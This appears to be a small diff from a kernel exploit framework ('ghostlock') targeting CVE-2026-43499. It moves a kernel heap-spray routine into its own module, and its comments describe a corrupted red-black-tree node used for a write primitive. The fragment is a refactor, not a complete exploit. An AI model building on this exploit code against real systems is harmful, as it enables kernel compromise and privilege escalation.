@@ -15,6 +15,7 @@
 #include "backend/cve_2026_43499_state.hpp"
 #include "backend/cve_2026_43499/route/route_middleware.hpp"
 #include "backend/cve_2026_43499/route/route_policy.hpp"
+#include "backend/cve_2026_43499/spray.hpp"
 #include "memory/direct_map.hpp"
 #include "support/decls.hpp"
 
@@ -157,7 +158,7 @@ namespace ghostlock::backend {
          * relink: waiter words are {pc = value, right = 0, left = target} and
          * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
         support::timer_mark("  heap spray start");
-        (ghostlock::backend::cve43499_state(session).heap.current.base) = support::prepare_good_kernel_page(request);
+        (ghostlock::backend::cve43499_state(session).heap.current.base) = cve_2026_43499::spray::prepare_good_kernel_page(request);
         if (!(ghostlock::backend::cve43499_state(session).heap.current.base)) {
             pr_warning("  heap spray failed\n");
             return 0;
